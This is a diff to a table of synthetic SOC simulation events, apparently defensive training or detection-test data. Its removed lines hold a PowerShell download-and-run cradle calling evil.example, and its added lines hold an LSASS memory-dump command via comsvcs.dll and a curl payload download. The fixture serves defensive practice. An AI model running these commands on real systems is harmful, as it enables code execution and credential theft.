@@ -228,46 +228,48 @@ SOC_SIMULATION_SCENARIOS = {
                 "event_type": "process",
                 "severity": "high",
                 "raw_event": {
-                    "timestamp": 1719751200,
+                    "synthetic": True,
                     "process": "powershell.exe",
-                    "command_line": "powershell -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.example/payload')"
+                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                    "CommandLine": "powershell.exe -EncodedCommand UwB5AG4AdABoAGUAdABpAGMA",
+                    "hostname": "replaced-per-simulation",
+                    "agent_id": "replaced-per-simulation"
                 },
                 "normalized_event": {
-                    "process": "powershell.exe",
-                    "command": "powershell -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.example/payload')"
+                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                    "CommandLine": "powershell.exe -EncodedCommand UwB5AG4AdABoAGUAdABpAGMA"
                 },
             },
             {
-                "source": "firewall",
-                "event_type": "network",
-                "severity": "medium",
+                "source": "windows-agent",
+                "event_type": "process",
+                "severity": "critical",
                 "raw_event": {
-                    "timestamp": 1719751250,
-                    "source_ip": "10.0.1.55",
-                    "destination_ip": "198.51.100.25",
-                    "destination_port": 443
+                    "synthetic": True,
+                    "Image": "C:\\Windows\\System32\\rundll32.exe",
+                    "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump lsass.exe synthetic.dmp full",
+                    "hostname": "replaced-per-simulation",
+                    "agent_id": "replaced-per-simulation"
                 },
                 "normalized_event": {
-                    "source_ip": "10.0.1.55",
-                    "destination_ip": "198.51.100.25"
+                    "Image": "C:\\Windows\\System32\\rundll32.exe",
+                    "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump lsass.exe synthetic.dmp full"
                 },
             },
             {
-                "source": "linux-agent",
-                "event_type": "login",
+                "source": "windows-agent",
+                "event_type": "process",
                 "severity": "high",
                 "raw_event": {
-                    "timestamp": 1719751300,
-                    "user": "admin",
-                    "source_ip": "203.0.113.200",
-                    "status": "failed",
-                    "attempts": 8
+                    "synthetic": True,
+                    "Image": "C:\\Windows\\System32\\curl.exe",
+                    "CommandLine": "curl.exe https://example.invalid/synthetic-payload -o synthetic.bin",
+                    "hostname": "replaced-per-simulation",
+                    "agent_id": "replaced-per-simulation"
                 },
                 "normalized_event": {
-                    "user": "admin",
-                    "source_ip": "203.0.113.200",
-                    "status": "failed",
-                    "attempts": 8
+                    "Image": "C:\\Windows\\System32\\curl.exe",
+                    "CommandLine": "curl.exe https://example.invalid/synthetic-payload -o synthetic.bin"
                 },
             },
         ],
